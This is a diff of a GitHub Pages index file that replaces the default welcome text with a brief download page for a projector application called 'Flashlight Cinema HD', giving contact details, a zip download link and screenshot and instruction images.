@@ -1,37 +1,19 @@
-## Welcome to GitHub Pages
+# Flashlight Cinema HD
+## Contact Info: +79656911377, kobieday8@gmail.com
+This Application for HP VP6321 Smart, HP SB21-DLP 1000, HP SB21 DLP and other projectors.
 
-You can use the [editor on GitHub](https://github.com/kobieday8/Flashlight-Cinema-HD/edit/gh-pages/index.md) to maintain and preview the content for your website in Markdown files.
+[Download](https://github.com/kobieday8/Flashlight-Cinema-HD/files/7747996/flashlightcinemahd.zip) application
 
-Whenever you commit to this repository, GitHub Pages will run [Jekyll](https://jekyllrb.com/) to rebuild the pages in your site, from the content in your Markdown files.
+![11](https://user-images.githubusercontent.com/91277269/146834125-f0ac24cc-008d-4cf2-9f13-08eb858e7f3c.jpg)
 
-### Markdown
+![22](https://user-images.githubusercontent.com/91277269/146834129-f41d8782-3bf3-43b0-9662-a01650d84e26.jpg)
 
-Markdown is a lightweight and easy-to-use syntax for styling your writing. It includes conventions for
+![33](https://user-images.githubusercontent.com/91277269/146834131-d24d1c45-2838-4961-af32-07d4ff3b62b9.jpg)
 
-```markdown
-Syntax highlighted code block
+![44](https://user-images.githubusercontent.com/91277269/146834134-bdafc609-c4b3-4199-aeda-e482a87ac7cd.jpg)
 
-# Header 1
-## Header 2
-### Header 3
+# Instruction
 
-- Bulleted
-- List
+![6](https://user-images.githubusercontent.com/90288327/144952128-4dc8e4e9-4725-4aa0-89f3-d0c60c827d97.png)
 
-1. Numbered
-2. List
-
-**Bold** and _Italic_ and `Code` text
-
-[Link](url) and ![Image](src)
-```
-
-For more details see [Basic writing and formatting syntax](https://docs.github.com/en/github/writing-on-github/getting-started-with-writing-and-formatting-on-github/basic-writing-and-formatting-syntax).
-
-### Jekyll Themes
-
-Your Pages site will use the layout and styles from the Jekyll theme you have selected in your [repository settings](https://github.com/kobieday8/Flashlight-Cinema-HD/settings/pages). The name of this theme is saved in the Jekyll `_config.yml` configuration file.
-
-### Support or Contact
-
-Having trouble with Pages? Check out our [documentation](https://docs.github.com/categories/github-pages-basics/) or [contact support](https://support.github.com/contact) and we’ll help you sort it out.
+![7](https://user-images.githubusercontent.com/90288327/144952132-73ab29c0-ad5b-42a3-8d14-13ec78d8666c.png)
